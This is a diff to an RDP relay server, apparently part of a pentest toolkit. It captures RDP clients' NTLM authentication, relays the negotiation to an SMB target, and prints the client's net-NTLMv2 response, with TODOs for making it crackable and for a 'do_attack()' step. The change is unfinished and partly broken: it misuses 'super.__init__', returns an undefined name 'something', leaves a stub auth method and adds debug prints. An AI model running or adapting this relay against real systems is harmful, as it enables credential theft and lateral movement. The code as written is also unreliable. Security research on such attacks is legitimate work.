@@ -4,7 +4,7 @@
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
-# HTTP Relay Server
+# RDP Relay Server
 #
 # Authors:
 #  Romain Carnus (gosecure)
@@ -40,7 +40,7 @@ class RDPHandler(socketserver.BaseRequestHandler):
         self.timeOut = 60*5
         self.socket = request
         self.select_poll = select_poll
-        socketserver.BaseRequestHandler.__init__(self, request, client_address, server)
+        super.__init__(self, request, client_address, server)
 
 
     def negociateRDP(self,pktdata):
@@ -59,7 +59,7 @@ class RDPHandler(socketserver.BaseRequestHandler):
             LOG.info("Client requested SSL protocol")
         else:
             LOG.info("Client asked for something else ...")
-            raise()
+            raise Exception('Unsupported requested protocol')
 
 
         response = TPKT()
@@ -106,6 +106,10 @@ class RDPHandler(socketserver.BaseRequestHandler):
         return
 
     def obtainNTLMChallenge(self,type1):
+        """
+
+        Returns a NTLM
+        """
         #Reuse of the code sample in smbserver.py:2733
         # Generate the AV_PAIRS
         av_pairs = ntlm.AV_PAIRS()
@@ -195,7 +199,7 @@ class RDPHandler(socketserver.BaseRequestHandler):
         else:
             LOG.error("Unknown SSP requested")
             self.finish()
-            raise()
+            raise Exception('Unknown SSP requested')
 
         
         #3.if NTLMSSP, relay to targets
@@ -215,26 +219,30 @@ class RDPHandler(socketserver.BaseRequestHandler):
         except:
             LOG.error("Unable to build tsRequest from type2 message")
             self.finish()
-            raise()
+            raise
 
         tls.sendall(buff)
 
         #This should be the type3 here:
         buff = tls.recv(4096)
         LOG.info("Received what seems to be the type3 from the client:")
-        print(buff.encode('hex'))
         try:
             tsreq.fromString(buff)
             type3 = tsreq['NegoData']
+            print(type3.getData().encode('hex'))
         except:
             LOG.error("Unable to parse packet as tsRequest")
             self.finish()
-            raise()
+            raise
 
         #TODO: present the type3 net-NTLMv2 data in a crackable format
 
-        #Respond with an authentication error here
-        #TODO
+        #TODO: send the type3 to the server
+        #clientResponse, errorCode = self.do_ntlm_auth(client,SPNEGO_token,challenge)
+
+        #TODO: Respond with an authentication error here
+
+        #TODO: do_attack()
 
         return
 
@@ -244,6 +252,9 @@ class RDPHandler(socketserver.BaseRequestHandler):
         self.RDPServer.removeConnection(self.connId)
         return socketserver.BaseRequestHandler.finish(self)
 
+    def do_ntlm_auth(self,client,SPNEGO_token,challenge):
+        pass
+
 
 class RDPRelayHandler(RDPHandler):
     def __init__(self, request, client_address, server, select_poll = False):
@@ -252,6 +263,10 @@ class RDPRelayHandler(RDPHandler):
         
 
     def obtainNTLMChallenge(self,type1):
+        """
+        obtain a NTLM challenge from a target
+        returns a NTLMAuthChallenge structure
+        """
         #Inspired by code in SmbNegotiate (smbrelayserver:110)
         connData = self.RDPServer.getConnectionData(self.connId, checkStatus=False)
 
@@ -280,6 +295,7 @@ class RDPRelayHandler(RDPHandler):
         #1.Extract the NTLM data from the TSRequest['NegoData']
         #   send it into the client
             client = connData['SMBClient']
+            print(client)
             try:
                 challengeMessage = self.do_ntlm_negotiate(client, token)
             except Exception:
@@ -297,6 +313,8 @@ class RDPRelayHandler(RDPHandler):
                 respToken['ResponseToken'] = challengeMessage.getData()
             else:
                 respToken = challengeMessage
+
+        return something
 
     #Initialize the correct client for the relay target
     def init_client(self,extSec):
